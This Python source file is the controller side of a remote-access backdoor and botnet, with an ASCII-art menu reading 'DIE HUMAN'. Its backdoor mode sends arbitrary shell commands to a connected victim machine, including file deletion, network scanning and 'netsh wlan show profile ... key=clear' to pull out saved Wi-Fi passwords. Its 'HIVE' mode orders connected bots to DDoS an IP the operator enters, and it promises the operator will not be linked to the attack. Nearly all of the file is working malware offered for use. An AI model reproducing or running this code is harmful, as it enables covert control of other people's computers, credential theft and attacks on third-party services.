
######imports###########################
import time                            #
import os                              #
import socket                          #
import threading
from threading import Thread           #
import re, uuid, platform              #
import subprocess                      #
from subprocess import check_output    #
import sys                             #
from queue import Queue                #
import urllib.request as urllib2       #
import json                            #
import codecs                          #
import struct   
import multiprocessing                 #
from multiprocessing import Process    #
########################################

global s
global conn

def bot_net_listen():
	print("Please give me 15 seconds the program is not frozen...")
	try:
		host = comip
		port = 9999
		s = socket.socket()
		print("Botnet variables complete...")
	except:
		input("Error making variables...\nPress Enter...")
		try:
			s.close()
			main()
		except:
			main()

	try:
		s.bind((host, port))
		print("Hive binding complete...")

	except:
		input("Hive binding error...\nPress enter...")
		try:
			s.close()
			main()
		except:
			main()

	while True:
		s.listen(99)
		conn, address = s.accept()

		conn.send(str.encode("@#whats your ip#@"))
		time.sleep(1)
		client_response = str(conn.recv(8192), ("utf-8"))
		print(client_response + ("\n"))


		print("===========================================")
		print("=============|Thrall Control|==============")
		print("")
		print("    DDOS: DDOS a website with your HIVE  ")
		print("    quit!: Quits HIVE and goes to main menu")
		while True:
			send_bot = input("Enter a command: ")

			if send_bot == ("quit!"):
				s.close()
				main()

			elif send_bot == ("DDOS"):
				conn.send(str.encode("@#Hive call#@"))
				print("\n=============================================")
				print("|All active thrall(BOTS) will attack...       |")
				print("|The more Thrall you have the better...       |")
				print("|You will not be linked in any way...         |")
				print("|If Thrall is attacking it will be unavalible |")
				print("===============================================")
				send_bot_ddos_ip = input("Enter an ip: ")
				conn.send(str.encode(send_bot_ddos_ip))
				print("Sent Target: " + send_bot_ddos_ip + " to the Thrall...")

				send_bot_ddos_count = input("Enter the attack count: ")
				conn.send(str.encode(send_bot_ddos_count))
				try:
					conn.send(str.encode("data_hive_quit_master"))
					time.sleep(1)
					s.close()
					conn.close()

				except:
					print("Sent Count: " + send_bot_ddos_count + " to the Thrall...")
					input("Thrall should be attacking target!\nPress enter to go to main menu...")
					main()

				finally:
					print("Sent Count: " + send_bot_ddos_count + " to the Thrall..." )
					input("Thrall should be attacking target!\nPress enter to go to main menu...")
					main()



			else:
				print(" ")




def bot_net():
	global s
	try:
		os.system("clear")

	except:
		os.system("cls")


	bot_net_listen()






def mac_lookup():
	try:
		#Website to extract data
		url = ("http://macvendors.co/api/")

		mac_address = input("\nEnter Mac Address: ")

		request = urllib2.Request(url+mac_address, headers={'User-Agent' : "API Browser"})

		rec_response = urllib2.urlopen( request )

		reader = codecs.getreader("utf-8")
		obj = json.load(reader(rec_response))
		print("")
		print(obj['result']['company'])
		print(obj['result']['address'])
		input("Press Enter...")
		main()
	except:
		input("[!]Error[!]\nPress enter...")
		main()



#create socket############################################
def socket_create():                                     #
	try:                                                   #
		global comip                                         #
		global host                                          # 
		global port                                          #
		global s                                             #
		host = (comip)
		port = (9999)
		s = socket.socket()

	except socket.error as msg:
		print ("Socket creation error: " + str(msg))

#bind to port and wait for connection from client
def socket_bind():
	try:
		global host
		global port
		global s
		s.bind((host, port))

	except socket.error as msg:
		print("\nSocket bindding error: " + str(msg) + ("\nRetry..."))
		socket_bind()

#Establish a connection with client (socket/ server must be listening for them)
def socket_accept():
	global usr_ip
	num_try = 0
	while num_try != 1:
		s.listen(20)
		conn, address = s.accept()
		conn.send(str.encode("@#whats your ip#@"))
		client_response = str(conn.recv(8192), ("utf-8"))
		conn.send(str.encode("quit"))
		print(client_response + ("\n"))
		num_try += 1


	usr_ip = input("|Select|IP|Infinity|-> ")



	num_try = 0
	while True:
		if num_try == (10):
			print("Too many Failed attempts...")
			input("Press enter... ")
			main()
		else:
			print("\nTrying...")
			s.listen(20)
			print("\nListening...\n")
			conn, address = s.accept()
			print("Accepting...")
			conn.send(str.encode("@#whats your ip#@"))
			print("\nSent Comfirmaition...\n")
			client_response = str(conn.recv(8192), ("utf-8"))
			print("Got response...")
			print(client_response, end=(""))

			if usr_ip in client_response:
				print("\nCorrect IP...\n")

				break
			else:
				print("\nWrong IP\n")

				conn.send(str.encode("quit"))

				num_try += 1

	print("\nConnection has been esablished | " + "IP " + address[0] + " | Port " + str(address[1]) + ("\nEnter [list!] for Infinity commands"))
	print (("\n") + str(conn) + ("\n"))
	print(address)
	send_commands(conn)#goes to def send_commands()
	conn.close()

#send target commands
def send_commands(conn):
	while True:
		try:
			cmd = input("|Infinity|-> ")
			if cmd == ("quit"):
				conn.send(str.encode(cmd))#sends client data
				time.sleep(5)#waits five seconds
				conn.close()#Closes connection
				s.close()#closes socket connection
				main()#goes to main()

			elif (cmd) == ("list!"):
				print("___________________________________ ")
				print("              |List|                ")
				print("___________________________________ ")
				print("")
				print("\n m!: Make text file...                 ")
				print("\n d!: Delete file...                  ")
				print("\n r!: Read a file...                  ")
				print("\n WP!: Show info of wifi...           ")
				print("\n SW!: Show past wifi connections...  ")
				print("\n TK!: Make client talk(use dashes instead of spaces)...\n")
				print(" CW!: Find current wifi ssid...\n")
				print("NET!: Find devices on network...\n")
				send_commands(conn)




			elif cmd == ("NET!"):
				conn.send(str.encode("arp -a"))
				client_response = str(conn.recv(8192), ("utf-8"))
				print(client_response, end=(""))



			elif (cmd) == ("TK!"):
				tk_input = input("Enter Text:")
				conn.send(str.encode("python txt_speech.py ") + (str.encode(tk_input)))


			elif (cmd) == ("m!"):
				make_txt_name = input("\nName of file: ")
				make_txt_content = input("\nContent: ")
				conn.send(str.encode(('echo ') + ("'") + (make_txt_content) + ("' >") + (make_txt_name) ))


			elif (cmd) == ("d!"):
				del_file_name = input("\nName of file: ")
				conn.send(str.encode(("del ") + (del_file_name)))

			elif (cmd) == ("r!"):
				read_file_name = input("Name of txt file: ")
				conn.send(str.encode(("more ") + (read_file_name)))
				client_response = str(conn.recv(8192), ("utf-8"))
				print(client_response, end=(""))

			elif (cmd) == ("SW!"):
				conn.send(str.encode("netsh wlan show profile"))
				client_response = str(conn.recv(8192), ("utf-8"))
				print(client_response, end=(""))

			elif (cmd) == ("WP!"):
				wifi_name_choice = input("Name of wifi: ")
				conn.send(str.encode(("netsh wlan show profile ") + (wifi_name_choice) + (" key=clear")))
				client_response = str(conn.recv(8192), ("utf-8"))
				print(client_response, end=(""))




			else: 
					if len(str.encode(cmd)) > (0): #if data = none of the above run code below
						conn.send(str.encode(cmd))
						client_response = str(conn.recv(8192), ("utf-8"))
						print(client_response, end=(""))

		except OSError:
			print("\nClient left session...")
			OsError_rec = input("\nEnter anything to go to start... ")

			if len(str(OsError_rec)) > (0):
				main()

			else:
				main()


def main():
	global comip
	#computer local ip
	try:
		comip = (check_output(['hostname', '--all-ip-addresses']))

	except:
		comip = ("NOT FOUND")
	#computer name
	comhostname = (socket.gethostname())
	#computer mac
	commac = (':'.join(re.findall('..', '%012x' % uuid.getnode())))
	#computer OS
	OS = (platform.system())
	try: 
		os.system("clear")
	except:
		try:

			os.system("cls")
		except:
			print("")




	print("		          .                                                      .")
	print("	        .n                   .                 .                  n.")
	print("	  .   .dP                  dP                   9b                 9b.    .")
	print("	 4    qXb         .       dX                     Xb       .        dXp     t")
	print("	dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb")
	print("	9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP")
	print("	 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP")
	print("	  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'")
	print("	    `9XXXXXXXXXXXP' `9XX'   DIE    `98v8P'  HUMAN   `XXP' `9XXXXXXXXXXXP'")
	print("	        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~")
	print("	                        )b.  .dbo.dP'`v'`9b.odb.  .dX(")
	print("	                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.")
	print("	                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb")
	print("	 1.Backdoor         dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb")
	print("	 2.Mac Info         9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP")
	print("	 3.HIVE(BOTNET)     `'       9XXXXXX(   )XXXXXXP      `'")
	print("	                              XXXX X.`v'.X XXXX")
	print("	                              XP^X'`b   d'`X^XX")
	print("	                              X. 9  `   '  P )X")
	print("	                              `b  `       '  d'")
	print("	                               `             '")
	print("                            ")
	print("                           ")
	print("  IP: " + (comip.decode('utf-8')))
	print("  Hostname: " + comhostname)
	print("  Computer Mac: " + commac)
	print("  Computer OS: " + OS)
	print("     \n")


	awn = input("Pick a number (enter [quit] to quit): ")


	if awn == ("1"):
		try:
			os.system("clear")
		except:
			try:
				os.system("cls")
			except:
				print("")

		def backdoor_start():
			try:
				socket_create()
				socket_bind()
				socket_accept()

			except RecursionError:
				os.system("clear")
				os.system("cls")

				print("[!]FATAL ERROR[!]\n\nTry again later...\n")

		backdoor_start()

	elif awn == ("2"):
		mac_lookup()
		main()

	elif awn == ("3"):
		bot_net()
		



	elif awn == ("quit"):
		sys.exit()




	else:
		main()


main()